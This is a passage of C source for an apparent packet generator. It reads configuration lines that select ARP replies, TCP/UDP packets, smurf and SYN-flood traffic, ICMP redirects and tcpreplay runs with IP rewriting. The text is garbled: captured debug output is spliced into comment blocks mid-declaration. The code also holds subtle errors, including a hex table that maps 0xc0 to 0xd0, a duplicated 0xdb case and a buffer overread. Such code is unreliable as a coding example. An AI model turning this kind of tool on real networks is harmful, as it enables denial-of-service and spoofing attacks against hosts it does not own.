				 temp = 0xab;
				 
			 }if (strcmp(temp_smac,"0xac") == 0)
			 {
				 temp = 0xac;
				 
			 }if (strcmp(temp_smac,"0xad") == 0)
			 {
				 temp = 0xad;
				 
			 }if (strcmp(temp_smac,"0xae") == 0)
			 {
				 temp = 0xae;
				 
			 }if (strcmp(temp_smac,"0xaf") == 0)
			 {
				 temp = 0xaf;
				 
			 }if (strcmp(temp_smac,"0xb0") == 0)
			 {
				 temp = 0xb0;
				 
			 }if (strcmp(temp_smac,"0xb1") == 0)
			 {
				 temp = 0xb1;
				 
			 }if (strcmp(temp_smac,"0xb2") == 0)
			 {
				 temp = 0xb2;
				 
			 }if (strcmp(temp_smac,"0xb3") == 0)
			 {
				 temp = 0xb3;
				 
			 }if (strcmp(temp_smac,"0xb4") == 0)
			 {
				 temp = 0xb4;
				 
			 }if (strcmp(temp_smac,"0xb5") == 0)
			 {
				 temp = 0xb5;
				 
			 }if (strcmp(temp_smac,"0xb6") == 0)
			 {
				 temp = 0xb6;
				 
			 }if (strcmp(temp_smac,"0xb7") == 0)
			 {
				 temp = 0xb7;
				 
			 }if (strcmp(temp_smac,"0xb8") == 0)
			 {
				 temp = 0xb8;
				 
			 }if (strcmp(temp_smac,"0xb9") == 0)
			 {
				 temp = 0xb9;
				 
			 }
			 if (strcmp(temp_smac,"0xba") == 0)
			 {
				 temp = 0xba;
				 
			 }if (strcmp(temp_smac,"0xbb") == 0)
			 {
				 temp = 0xbb;
				 
			 }if (strcmp(temp_smac,"0xbc") == 0)
			 {
				 temp = 0xbc;
				 
			 }if (strcmp(temp_smac,"0xbd") == 0)
			 {
				 temp = 0xbd;
				 
			 }if (strcmp(temp_smac,"0xbe") == 0)
			 {
				 temp = 0xbe;
				 
			 }if (strcmp(temp_smac,"0xbf") == 0)
			 {
				 temp = 0xbf;
				 
			 }if (strcmp(temp_smac,"0xc0") == 0)
			 {
				 temp = 0xd0;
				 
			 }if (strcmp(temp_smac,"0xc1") == 0)
			 {
				 temp = 0xc1;
				 
			 }if (strcmp(temp_smac,"0xc2") == 0)
			 {
				 temp = 0xc2;
				 
			 }if (strcmp(temp_smac,"0xc3") == 0)
			 {
				 temp = 0xc3;
				 
			 }if (strcmp(temp_smac,"0xc4") == 0)
			 {
				 temp = 0xc4;
				 
			 }if (strcmp(temp_smac,"0xc5") == 0)
			 {
				 temp = 0xc5;
				 
			 }if (strcmp(temp_smac,"0xc6") == 0)
			 {
				 temp = 0xc6;
				 
			 }if (strcmp(temp_smac,"0xc7") == 0)
			 {
				 temp = 0xc7;
				 
			 }if (strcmp(temp_smac,"0xc8") == 0)
			 {
				 temp = 0xc8;
				 
			 }if (strcmp(temp_smac,"0xc9") == 0)
			 {
				 temp = 0xc9;
				 
			 }
			 if (strcmp(temp_smac,"0xca") == 0)
			 {
				 temp = 0xca;
				 
			 }if (strcmp(temp_smac,"0xcb") == 0)
			 {
				 temp = 0xcb;
				 
			 }if (strcmp(temp_smac,"0xcc") == 0)
			 {
				 temp = 0xcc;
				 
			 }if (strcmp(temp_smac,"0xcd") == 0)
			 {
				 temp = 0xcd;
				 
			 }if (strcmp(temp_smac,"0xce") == 0)
			 {
				 temp = 0xce;
				 
			 }if (strcmp(temp_smac,"0xcf") == 0)
			 {
				 temp = 0xcf;
				 
			 }if (strcmp(temp_smac,"0xd0") == 0)
			 {
				 temp = 0xd0;
				 
			 }if (strcmp(temp_smac,"0xd1") == 0)
			 {
				 temp = 0xd1;
				 
			 }if (strcmp(temp_smac,"0xd2") == 0)
			 {
				 temp = 0xd2;
				 
			 }if (strcmp(temp_smac,"0xd3") == 0)
			 {
				 temp = 0xd3;
				 
			 }if (strcmp(temp_smac,"0xd4") == 0)
			 {
				 temp = 0xd4;
				 
			 }if (strcmp(temp_smac,"0xd5") == 0)
			 {
				 temp = 0xd5;
				 
			 }if (strcmp(temp_smac,"0xd6") == 0)
			 {
				 temp = 0xd6;
				 
			 }if (strcmp(temp_smac,"0xd7") == 0)
			 {
				 temp = 0xd7;
				 
			 }if (strcmp(temp_smac,"0xd8") == 0)
			 {
				 temp = 0xd8;
				 
			 }if (strcmp(temp_smac,"0xd9") == 0)
			 {
				 temp = 0xd9;
				 
			 }
			 if (strcmp(temp_smac,"0xda") == 0)
			 {
				 temp = 0xda;
				 
			 }if (strcmp(temp_smac,"0xdb") == 0)
			 {
				 temp = 0xdb;
				 
			 }if (strcmp(temp_smac,"0xdb") == 0)
			 {
				 temp = 0xdb;
				 
			 }if (strcmp(temp_smac,"0xdd") == 0)
			 {
				 temp = 0xdd;
				 
			 }if (strcmp(temp_smac,"0xde") == 0)
			 {
				 temp = 0xde;
				 
			 }if (strcmp(temp_smac,"0xdf") == 0)
			 {
				 temp = 0xdf;
				 
			 }if (strcmp(temp_smac,"0xe0") == 0)
			 {
				 temp = 0xe0;
				 
			 }if (strcmp(temp_smac,"0xe1") == 0)
			 {
				 temp = 0xe1;
				 
			 }if (strcmp(temp_smac,"0xe2") == 0)
			 {
				 temp = 0xe2;
				 
			 }if (strcmp(temp_smac,"0xe3") == 0)
			 {
				 temp = 0xe3;
				 
			 }if (strcmp(temp_smac,"0xe4") == 0)
			 {
				 temp = 0xe4;
				 
			 }if (strcmp(temp_smac,"0xe5") == 0)
			 {
				 temp = 0xe5;
				 
			 }if (strcmp(temp_smac,"0xe6") == 0)
			 {
				 temp = 0xe6;
				 
			 }if (strcmp(temp_smac,"0xe7") == 0)
			 {
				 temp = 0xe7;
				 
			 }if (strcmp(temp_smac,"0xe8") == 0)
			 {
				 temp = 0xe8;
				 
			 }if (strcmp(temp_smac,"0xe9") == 0)
			 {
				 temp = 0xe9;
				 
			 }
			 if (strcmp(temp_smac,"0xea") == 0)
			 {
				 temp = 0xea;
				 
			 }if (strcmp(temp_smac,"0xeb") == 0)
			 {
				 temp = 0xeb;
				 
			 }if (strcmp(temp_smac,"0xec") == 0)
			 {
				 temp = 0xec;
				 
			 }if (strcmp(temp_smac,"0xed") == 0)
			 {
				 temp = 0xed;
				 
			 }if (strcmp(temp_smac,"0xee") == 0)
			 {
				 temp = 0xee;
				 
			 }if (strcmp(temp_smac,"0xef") == 0)
			 {
				 temp = 0xef;
				 
			 }if (strcmp(temp_smac,"0xf0") == 0)
			 {
				 temp = 0xf0;
				 
			 }if (strcmp(temp_smac,"0xf1") == 0)
			 {
				 temp = 0xf1;
				 
			 }if (strcmp(temp_smac,"0xf2") == 0)
			 {
				 temp = 0xf2;
				 
			 }if (strcmp(temp_smac,"0xf3") == 0)
			 {
				 temp = 0xf3;
				 
			 }if (strcmp(temp_smac,"0xf4") == 0)
			 {
				 temp = 0xf4;
				 
			 }if (strcmp(temp_smac,"0xf5") == 0)
			 {
				 temp = 0xf5;
				 
			 }if (strcmp(temp_smac,"0xf6") == 0)
			 {
				 temp = 0xf6;
				 
			 }if (strcmp(temp_smac,"0xf7") == 0)
			 {
				 temp = 0xf7;
				 
			 }if (strcmp(temp_smac,"0xf8") == 0)
			 {
				 temp = 0xf8;
				 
			 }if (strcmp(temp_smac,"0xf9") == 0)
			 {
				 temp = 0xf9;
				 
			 }
			 if (strcmp(temp_smac,"0xfa") == 0)
			 {
				 temp = 0xfa;
				
			 }if (strcmp(temp_smac,"0xfb") == 0)
			 {
				 temp = 0xfb;
				 
			 }if (strcmp(temp_smac,"0xfc") == 0)
			 {
				 temp = 0xfc;
				 
			 }if (strcmp(temp_smac,"0xfd") == 0)
			 {
				 temp = 0xfd;
				 
			 }if (strcmp(temp_smac,"0xfe") == 0)
			 {
				 temp = 0xfe;
				 
			 }if (strcmp(temp_smac,"0xff") == 0)
			 {
				 temp = 0xff;				 
			 }

			 if (select==0)
			 {
				enet_src[k] = temp;
			 }
			 else {
				enet_dst[k] =temp; 
			 }
		 }
	 }

}



void configure_file(char *file)
{
	FILE *stream;
    	char Line[500];
	int check=0;
	
	 if( (stream = fopen( file, "r" )) != NULL )
   {
     
		  while (1)
		  {
		  if( fgets( Line, 1000, stream ) == NULL)
			break;
		  else
			{
			  //messages[0]=Line;
			  //printf("line : %s \n",Line);
			  //delay();
			  //printf("-------------------\n");	
			  
			  check = checkreplay(Line);
			  if (check ==1) break;

			  checkarp(Line);
			  checktcp(Line);
			  checkudp(Line);
			  checksmurf(Line);
			  checksynflood(Line);
			  checkicmp_redirect(Line);
			  checkicmp_timestamp(Line);
			  checkicmp_timeexceed(Line);
			  checkicmp_echo_cq(Line);
			  checkicmp_unreach(Line);
			  checkip(Line);
			}
			if (check ==1) break;
		  }
	  //}	 
	  fclose( stream );
   }
		/*rc = pthread_join(threads,&thread_result);
		if (rc != 0)
		{
			perror("Thread join failed");
			exit(EXIT_FAILURE);
		}*/

}



int checkarp(char *l)
{
		Gen gen;
		int delay;
		pthread_t threads_arp;
		int rc_arp;	
/*
		int i;
		int j;
		int k;
		int delay;
		
		char check[50];
		char device[10];
		char type[20];
		char src_ip[20];
		char src_mac[30];
		char dst_ip[20];
		char dst_mac[30];
		char cat[2];
		charemo.pcap eth0 -1 2 NULL NULL 0
-- before check tcpreplay
line : arp=eth0,reply,161.246.5.24,0x010x060x1b0xd50xdd0x7c,161.246.5.5,0xff0xff0xff0xff0xff0xff,5,p5   *network,number,time
  
-- before check arp
-- before check 5
eth0 reply 161.246.5.24 0x010x060x1b0xd50xdd0x7c 161.246.5.5 0xff0xff0xff0xff0xff0xff 5
5
 packet[10];

		//int modet;
		//int packett;
		
		//char run[50];
		
		//char arp[50];
		char line[500];
		//char *device;
	    char time_x[20];
		//char packet[10];
		char mode;*/

			
		strcpy(line,l);
		//strcpy(cat,"");
		//strcpy(run,"");
		strcpy(check,"");
		strcpy(device,"");
		strcpy(type,"");
		strcpy(src_ip,"");
		strcpy(src_mac,"");
		strcpy(dst_ip,"");
		strcpy(dst_mac,"");
		strcpy(time_x,"");
		strcpy(packet,"");
		//packett = 0; 

		 for (i=0;i<50;i++ )
		  {
			  if (line[i] == '=')
				break;	
			  else
			  {
				//printf("---------------check1------------\n");
				sprintf( cat , "%c", line[i]);	
				//printf("---------------check2------------\n");
				strcat(check,cat);	
				
			  }
		  }

			//printf("-- before check %s \n",check);	

		  if (strcmp(check,"arp") == 0)
		  {
			  // device
			  strcpy(check,"");
			  for (j=i+1;j<500;j++)
			  {
				  strcpy(cat,"");				  
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(device,cat);
			  }


			  //printf("-- before check %s \n",check);	

			 
			 // printf("device = %s \n",gen.device);				  

  	      
			  for (j=j+1;j<j+500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(type,cat);
			  }

			  ///printf("-- before check %s \n",check);	
			  
			  //printf("type = %s \n",gen.type);
				
     		
			  
			  for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(src_ip,cat);
			  }

			  ///printf("-- before check %s \n",check);	
			  
			  //printf("src_ip = %s \n",gen.src_ip);


			  
			  for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(src_mac,cat);
			  }

			  ///printf("-- before check %s \n",check);	
			 
			  //printf("src_mac = %s \n",gen.src_mac);

			  
			  for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(dst_ip,cat);
			  }

			  ///printf("-- before check %s \n",check);	
			  
			  //printf("dst_ip = %s \n",gen.dst_ip);


			  
			  for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(dst_mac,cat);
			  }
				
			   
			   for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(packet,cat);
			  }

			  //printf("-- before check %s \n",packet);	
			   gen.device = device;
			   gen.type = type;
			   gen.src_ip = src_ip;
			   gen.src_mac = src_mac;
			   gen.dst_ip = dst_ip;
			   gen.dst_mac = dst_mac;
			   gen.count = atoi(packet);

			  //printf("%s %s %s %s %s %s %d\n",gen.device,gen.type,gen.src_ip,gen.src_mac,gen.dst_ip,gen.dst_mac,gen.count);
			 // printf("type = %s \n",gen.dst_mac);

			  for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ' ') break;
				
				  if (line[j] == 'p')
				  {
					mode = 'p' ;
				  }
				  else if (line[j] == 't')
				  {
					mode = 't' ;
				  }
				  else
				  {
				  sprintf( cat , "%c", line[j]);
				  strcat(time_x,cat);				 
				  }
			  }

			  //sprintf(arp,"./arp %s",run);

			  if (mode == 'p')
			  {
				  delay = atoi(time_x);
				 //CountPacket(delay);
			  }

			  if (mode == 't')
			  {
				 //DelayTime(time_x);
			  }

			//  packett = atoi(packet);

			 // for(i=0; i<packett; i++)
			//	Run(arp); */
			//printf("%d \n",delay);
			CountPacket(delay);
			arp(&gen);
			return 1; //success
	
		  }
	return 0; //failed
}

int checktcp(char *l)
{
		Gen gen;
		/*int i;
		int j;
		int k;
		int delay;
		

		char check[50];
		char device[10];
		//char type[20];
		char src_ip[20];
		char src_prt[10];
		//char src_mac[30];
		char dst_ip[20];
		char dst_prt[10];
		//char dst_mac[30];
		char payload[100];
		char payload_s[10];
		char cat[2];
		char packet[10];

		
		char line[500];
		char time_x[20];
		char mode;*/

			
		strcpy(line,l);
		//strcpy(cat,"");
		//strcpy(run,"");
		strcpy(check,"");
		strcpy(device,"");
		//strcpy(type,"");
		strcpy(src_ip,"");
		strcpy( src_prt,"");
		//strcpy(src_mac,"");
		strcpy(dst_ip,"");
		strcpy(dst_prt,"");
		strcpy(payload,"");
		strcpy(payload_s,"");
		//strcpy(dst_mac,"");
		strcpy(time_x,"");
		strcpy(packet,"");
		//packett = 0; 

		 for (i=0;i<50;i++ )
		  {
			  if (line[i] == '=')
				break;	
			  else
			  {
				//printf("---------------check1------------\n");
				sprintf( cat , "%c", line[i]);	
				//printf("---------------check2------------\n");
				strcat(check,cat);	
				
			  }
		  }

			//printf("-- before check %s \n",check);	

		  if (strcmp(check,"tcp") == 0)
		  {
			  // device
			  strcpy(check,"");
			  for (j=i+1;j<500;j++)
			  {
				  strcpy(cat,"");				  
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(device,cat);
			  }

			   for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(src_ip,cat);
			  }


			  for (j=j+1;j<j+500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(src_prt,cat);
			  }

			  /*for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(src_mac,cat);
			  }*/

			  
			  for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(dst_ip,cat);
			  }

			   for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(dst_prt,cat);
			  }

			  /*for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(dst_mac,cat);
			  }*/

			   for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(payload,cat);
			  }

			   for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(payload_s,cat);
			  }
				
			   
			   for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(packet,cat);
			  }

			// printf("-- before check %s \n",packet);	
			   gen.device = device;
			   gen.src_ip = src_ip;
			   gen.src_prt = atoi(src_prt);
			   gen.dst_ip = dst_ip;
			   gen.dst_prt = atoi(dst_prt);
			   gen.payload = payload;
			   gen.payload_s = atoi(payload_s);
			   gen.count = atoi(packet);

			//  printf("%s %s %d %s %d %s %d %d\n",gen.device,gen.src_ip,gen.src_prt,gen.dst_ip,gen.dst_prt,gen.payload,gen.payload_s,gen.count);
			 // printf("type = %s \n",gen.dst_mac);

			  for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ' ') break;
				
				  if (line[j] == 'p')
				  {
					mode = 'p' ;
				  }
				  else if (line[j] == 't')
				  {
					mode = 't' ;
				  }
				  else
				  {
				  sprintf( cat , "%c", line[j]);
				  strcat(time_x,cat);				 
				  }
			  }

			  //sprintf(arp,"./arp %s",run);

			  if (mode == 'p')
			  {
				  delay = atoi(time_x);
				 //CountPacket(delay);
			  }

			  if (mode == 't')
			  {
				 //DelayTime(time_x);
			  }

			//  packett = atoi(packet);

			 // for(i=0; i<packett; i++)
			CountPacket(delay);
			tcp(&gen);
			return 1; //success
		  }
	return 0;

}

int checkudp(char *l)
{
		/*int i;
		int j;
		int k;
		int delay;*/
		Gen gen;
		int cmp;

		/*char check[50];
		char device[10];
		//char type[20];
		char src_ip[20];
		char src_prt[10];
		//char src_mac[30];
		char dst_ip[20];
		char dst_prt[10];
		//char dst_mac[30];
		char payload[100];
		char payload_s[10];
		char cat[2];- before check tcpreplay
line : arp=eth0,reply,161.246.5.24,0x010x060x1b0xd50xdd0x7c,161.246.5.5,0xff0xff0xff0xff0xff0xff,5,p5   *network,number,time
  
-- before check arp
-- before check 5
eth0 reply 161.246.5.24 0x010x060x1b0xd50xdd0x7c 161.246.5.5 0xff0xff0xff0xff0xff0xff 5
5

		char packet[10];

		
		char line[500];
		char time_x[20];
		char mode;*/

			
		strcpy(line,l);
		//strcpy(cat,"");
		//strcpy(run,"");
		strcpy(check,"");
		strcpy(device,"");
		//strcpy(type,"");
		strcpy(src_ip,"");
		strcpy( src_prt,"");
		//strcpy(src_mac,"");
		strcpy(dst_ip,"");
		strcpy(dst_prt,"");
		strcpy(payload,"");
		strcpy(payload_s,"");
		//strcpy(dst_mac,"");
		strcpy(time_x,"");
		strcpy(packet,"");
		//packett = 0; 

 for (i=0;i<50;i++ )
		  {
			  if (line[i] == '=')
				break;	
			  else
			  {
				//printf("---------------check1------------\n");
				sprintf( cat , "%c", line[i]);	
				//printf("---------------check2------------\n");
				strcat(check,cat);	
				
			  }
		  }

			//printf("-- before check %s \n",check);	

		  if ((cmp = strcmp(check,"udp")) == 0)
		  {
			  		// device
			  strcpy(check,"");
			  for (j=i+1;j<500;j++)
			  {
				  strcpy(cat,"");				  
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(device,cat);
			  }

			   for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(src_ip,cat);
			  }


			  for (j=j+1;j<j+500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(src_prt,cat);
			  }

			  /*for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(src_mac,cat);
			  }*/

			  
			  for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat ,"%c", line[j]);
				  strcat(dst_ip,cat);
			  }

			  for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(dst_prt,cat);
			  }

			  /*for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(dst_mac,cat);
			  }*/

			   for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat ,"%c", line[j]);
				  strcat(payload,cat);
			  }

			  for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(payload_s,cat);
			  }
				
	   
			   for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(packet,cat);
			  }

			 //printf("-- before check %s \n",packet);	
			   gen.device = device;
			   gen.src_ip = src_ip;
			   gen.src_prt = atoi(src_prt);
			   gen.dst_ip = dst_ip;
			   gen.dst_prt = atoi(dst_prt);
			   gen.payload = payload;
			   gen.payload_s = atoi(payload_s);
			   gen.count = atoi(packet);

			 // printf("%s %s %d %s %d %s %d %d\n",gen.device,gen.src_ip,gen.src_prt,gen.dst_ip,gen.dst_prt,gen.payload,gen.payload_s,gen.count);
			 // printf("type = %s \n",gen.dst_mac);

			  for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ' ') break;
				
				  if (line[j] == 'p')
				  {
					mode = 'p' ;
				  }
				  else if (line[j] == 't')
				  {
					mode = 't' ;
				  }
				  else
				  {
				  sprintf( cat , "%c", line[j]);
				  strcat(time_x,cat);				 
				  }
			  }

			  //sprintf(arp,"./arp %s",run);

			  if (mode == 'p')
			  {
				  delay = atoi(time_x);
				 //CountPacket(delay);
			  }

			  if (mode == 't')
			  {
				 //DelayTime(time_x);
			  }

			//  packett = atoi(packet);

			 // for(i=0; i<packett; i++)
			CountPacket(delay);
			udp(&gen);
			return 1; //success
		  }
	return 0;

}

int checkreplay(char *l)
{
		//tcp_replay(file,device,-1,speed,NULL,NULL,print);	
		//pthread_t threads;
		//int rc;
		//int i;
		//int j;
		
		Replay rep;
		pid_t pid;
		char protocol[20];
		char x;
		void *xX = NULL;
		char ip[40];


		rep.device="";        //all
		rep.file="";			 //icmp arp
		rep.speed=1;
		rep.print = 0;        //tcp udp
		rep.rewriteip = 0;
		rep.nat_interface = 0;
		rep.packet = -1;

	
		//char sip[20];
		//char dst[20];
				
		
		strcpy(line,l);
		strcpy(check,"");
		strcpy(file,"");
		strcpy(device,"");
		strcpy(packet,"");
		strcpy(speed,"");
		strcpy(src_ip,"");
		strcpy(dst_ip,"");
		strcpy(ip,"");
		strcpy(protocol,"");

		for (i=0;i<500;i++ )
		  {
			 strcpy(cat,"");
			  if (line[i] == '=')
				break;	
			  else
			  {
				sprintf(cat , "%c", line[i]);		
				strcat(check,cat);				
			  }
		  }
			
		  if (strcmp(check,"tcpreplay") == 0)
		  {
			  strcpy(cat,"");
			  for (j=i+1;j<500;j++)
			  {
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(file,cat);
				 
			  }

			   
			  for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(device,cat);
				 
			  }

			 
			  for (j=j+1;j<500;j++)
			  {
				 strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(speed,cat);
				 
			  }

			  for (j=j+1;j<500;j++)
			  {
				   strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(src_ip,cat);
				 
			  }

			   for (j=j+1;j<500;j++)
			  {
				   strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(dst_ip,cat);
				 
			  }
				
			  //////////////select tive packet
			  j = j+1;
			  x = line[j];

			  for (j=j+1;j<500;j++)
			  {
				   strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(protocol,cat);
				 
			  }		
			   //strcpy(cat,"");
			  //for (j=i+1;j<500;j++)
			  //{
				  if (line[j+1] == '0') 
				  {
					///  printf("xxxxx0\n");
					  rep.print = 0;
					  //break;
				  }
				  if (line[j+1] == '1') {
					//  printf("xxxxx1\n");
					  rep.print = 1;
					  //break;
				  }

		
		//printf("%s %s %s %s %s %s %s %d\n",check,file,device,packet,speed,dsrc_ip,ddst_ip,print);
	     rep.file = file;
		 rep.device = device;
		 //rep.packet = atoi(packet);
		 rep.speed = atoi(speed);
		 rep.csrc_ip = src_ip;
		 rep.cdst_ip = dst_ip;
		 rep.protocol = protocol;
		// rep.print = atoi(print)
		//printf("xxxxxxxxx %s %s %s %s \n",file,dst_ip,src_ip,protocol);
		// 
		//strcpy(x,"");
		if ( ( x != 'N') )// && ( x != 'n') )
		{
			printf("X or x \n");
			if (x == 'x')
			{
				 if (include_exclude_mode != 0)
                errx(1, "Error: Can only specify -x OR -X");

            include_exclude_mode = 'x';
            if ((include_exclude_mode = 
                 parse_xX_str(include_exclude_mode, optarg, &xX)) == 0)
                errx(1, "Unable to parse -x: %s", optarg);

            if (include_exclude_mode & xXPacket) {
                xX_list = (LIST *) xX;
            } else if (! (include_exclude_mode & xXBPF)) {
                xX_cidr = (CIDR *) xX;
            }
			}
			
			if (x == 'X')
			{
			if (include_exclude_mode != 0)
                errx(1, "Error: Can only specify -x OR -X");

            include_exclude_mode = 'X';
            if ((include_exclude_mode = 
                 parse_xX_str(include_exclude_mode, optarg, &xX)) == 0)
                errx(1, "Unable to parse -X: %s", optarg);

            if (include_exclude_mode & xXPacket) {
                xX_list = (LIST *) xX;
            } else {
                xX_cidr = (CIDR *) xX;
            } 
			}
		}

		if (  ((strcmp(src_ip,"NULL")) != 0) )//&& ((strcmp(src_ip,"null")) != 0 ) )
		{
			//printf("N \n");
			sprintf(ip,"0.0.0.0/0:%s",src_ip);
			
			rep.rewriteip ++;
			rep.nat_interface ++;
			jo = jo + 1;

				//printf("%d \n",rep.nat_interface);
				// first -N is primary nic //
				if (rep.nat_interface == 1) {
					if (! parse_cidr_map(&cidrmap_data1, ip))
						errx(1, "Invalid primary NAT string");
				} else { // after that, secondary nic //
					if (! parse_cidr_map(&cidrmap_data2, ip))
						errx(1, "Invalid secondary NAT string");
				}
		}

		strcpy(ip,"");
		if (  ((strcmp(dst_ip,"NULL")) != 0) )//&& ((strcmp(dst_ip,"null")) != 0 ) )
		{
			//printf("N \n");
			sprintf(ip,"0.0.0.0/0:%s",dst_ip);
			
			rep.rewriteip ++;
			rep.nat_interface ++;
			jo = jo + 1;

				//printf("%d \n",rep.nat_interface);
				// first -N is primary nic //
				if (rep.nat_interface == 1) {
					if (! parse_cidr_map(&cidrmap_data1, ip))
						errx(1, "Invalid primary NAT string");
				} else { // after that, secondary nic //
					if (! parse_cidr_map(&cidrmap_data2, ip))
						errx(1, "Invalid secondary NAT string");
				}
		}	
		


	//printf("%s %s %d %d %s %s %d\n",rep.file,rep.device,rep.packet,rep.speed,rep.dsrc_ip,rep.ddst_ip,rep.print);
	//tcp_replay(&rep);
	if (set_replay == 0)  
			  {
				//rc = pthread_create(&threads, NULL,(void *) &tcp_replay,(void *) &rep);
				pid = fork();	
				switch(pid)
				  {
						case -1:
							perror("fork failed");
							break;

						case 0:
							tcp_replay(&rep);
							//printf("finish \n");
							return 1;
							break;
						default:
							
							break;
				  }
				set_replay = 1;

				
						/*if (rc)
							 {
								   printf("ERROR; return code from pthread_create() is %d\n", rc);
								   set_replay = 0;
								   exit(-1);
								  
							 }*/
			  }

			  //while(1)
			//	  {
			//		printf("loop");
			//	  }
			return 0;
		}
			
	


/*			  
			  sprintf(replay,"tcpreplay -m 7.3 -i eth0 %s",path);

			 rc = pthread_create(&threads, NULL, ReplayPacket, (void *) replay);
			if (rc)
		     {
			       printf("ERROR; return code from pthread_create() is %d\n", rc);
			       exit(-1);
		     }*/
	return 0;		
		
}

int checksmurf(char *l)
{

		
		Gen gen;
		
		strcpy(line,l);
		strcpy(check,"");
		strcpy(device,"");
		strcpy(dst_ip,"");
		strcpy(amp_ip,"");
		strcpy(time_x,"");
		strcpy(packet,"");
		

		 for (i=0;i<50;i++ )
		  {
			  if (line[i] == '=')
				break;	
			  else
			  {
				//printf("---------------check1------------\n");
				sprintf( cat , "%c", line[i]);	
				//printf("---------------check2------------\n");
				strcat(check,cat);	
				
			  }
		  }

		  //printf("-- before  smurf  check %s \n",check);	

		  if (strcmp(check,"smurf") == 0)
		  {
			   strcpy(check,"");
			  for (j=i+1;j<500;j++)
			  {
				  strcpy(cat,"");				  
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(device,cat);
			  }

			   for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(dst_ip,cat);
			  }

				// printf("-- xxxxxxxxxxxxxxxxxxxxxxxn");	
			  for (j=j+1;j<j+500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(amp_ip,cat);
			  }

			  for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ',') break;
				  sprintf( cat , "%c", line[j]);
				  strcat(packet,cat);
			  }

			    //printf("-- xxxxxxxxxxxxxxxxxxxxxxxn");	
			   gen.device = device;
			   gen.dst_ip = dst_ip;
			   gen.amplifier = amp_ip;
			   gen.count = atoi(packet);

			   for (j=j+1;j<500;j++)
			  {
				  strcpy(cat,"");
				  if (line[j] == ' ') break;
				
				  if (line[j] == 'p')
				  {
					mode = 'p' ;
				  }
				  else if (line[j] == 't')
				  {
					mode = 't' ;
				  }
				  else
				  {
